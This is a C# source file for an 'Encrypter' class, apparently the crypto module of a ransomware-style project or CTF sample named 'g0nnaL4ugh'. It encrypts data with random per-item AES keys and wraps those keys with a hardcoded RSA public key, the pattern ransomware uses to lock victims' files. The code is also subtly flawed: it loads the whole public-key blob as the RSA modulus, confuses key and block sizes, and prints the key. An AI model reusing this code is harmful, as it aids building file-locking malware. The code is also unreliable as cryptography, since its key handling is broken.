using System;
using System.IO;
using System.Security.Cryptography;

namespace g0nnaL4ugh.Crypto
{
    public class Encrypter
    {
        // Harcoded Public key, don't forget to change it
        public static readonly string publicKey = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxSH6JLTzicAdkxq3kJTOFdUsrKgOX/hjd/KiohKo93A+d6CwnCO3MnR3n7jA1HPDeZ1+LwNeT48AkZeHeavbN+QNOYKtV5hmd7Gq8f094KCDe2o4H0ka48/Y7KXpdUXX/KPGC7y+ULH8Vk199N7JzHbPuDDR9JITl4RGRjRO1tdV8K+eAG2kwsmc041j4XqWRbGlr/REcGi3ZASgNL+TyJ838wgeU8F+YdPRe3Wdoxd6A91Uxpy2K/b3ZWibs5BcgKoKqjsyMEq+iEM98ShQhoR/vOPykTA0Bxwa4YhhvgpvIxhciu4Rm0nDzPBE1Ck9EqYT4qJk/ipvqeycpaIEBwIDAQAB";
      
        private static byte[] GenerateTrulyRandom(int length)
        {
            byte[] randomBytes = new byte[length];
            using (var randito = new RNGCryptoServiceProvider())
            {
                randito.GetNonZeroBytes(randomBytes);
                randito.Dispose();
            }
            return randomBytes;
        }

        public byte[] GenerateRandomPrivateKey()
        {
            // The length will be random between 23 and 28
            Random random = new Random();
            int length = random.Next(23, 28);
            byte[] randomBytes = Encrypter.GenerateTrulyRandom(length);
            return randomBytes;
        }

        public byte[] GenerateRandomSalt()
        {
            byte[] randomBytes = Encrypter.GenerateTrulyRandom(Utilities.SaltSizeBytes);
            return randomBytes;
        }

        public byte[] EncryptBytes(byte[] bytes2Encrypt, byte[] password, byte[] salt)
        {
            byte[] encryptedBytes = null;
            byte[] saltedEncryptedBytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged RJM = new RijndaelManaged())
                {
                    /*
                    * Setting up the encryption block size (CBC size) and 
                    * key size (derivate key from password and salt with # iterations)
                    */
                    RJM.KeySize = Utilities.BlockSizeBits;
                    RJM.BlockSize = Utilities.BlockSizeBits;
                    var key = new Rfc2898DeriveBytes(password, salt, 1500);
                    RJM.Key = key.GetBytes(RJM.KeySize / 8);
                    RJM.IV = key.GetBytes(RJM.BlockSize / 8);
                    /* Set CBC mode, it's the most secure for AES alike */
                    RJM.Mode = CipherMode.CBC;
                    /* Finally encript bytes */
                    using (var cs = new CryptoStream(ms, RJM.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytes2Encrypt, 0, bytes2Encrypt.Length);
                        cs.Close();
                    }
                    /* TODO: We need to append the salt to the encrypted bytes */
                    encryptedBytes = ms.ToArray();
                    saltedEncryptedBytes = Utilities.ConcatBytes(salt, encryptedBytes);
                }
            }
            return saltedEncryptedBytes;
        }

        public byte[] AsymEncryptBytes(byte[] bytes2Encrypt)
        {
            byte[] encryptedBytes = null;
            using (RSACryptoServiceProvider rsa = 
			       new RSACryptoServiceProvider())  
            {
                RSAParameters rsaParam = rsa.ExportParameters(false);
                rsaParam.Modulus = Convert.FromBase64String(publicKey);
                rsa.ImportParameters(rsaParam);
                // Get the public key
                // string publicKey2 = rsa.ToXmlString(false); // false to get the public key
                // string privateKey = rsa.ToXmlString(true); // true to get the private key
                Console.WriteLine(publicKey);
                // Set the rsa pulic key
                // rsa.FromXmlString(publicKey2);
                // encryptedBytes = rsa.Encrypt(bytes2Encrypt, true);
                encryptedBytes = rsa.Encrypt(bytes2Encrypt, false);
            }
            return encryptedBytes;
        }
    }
}
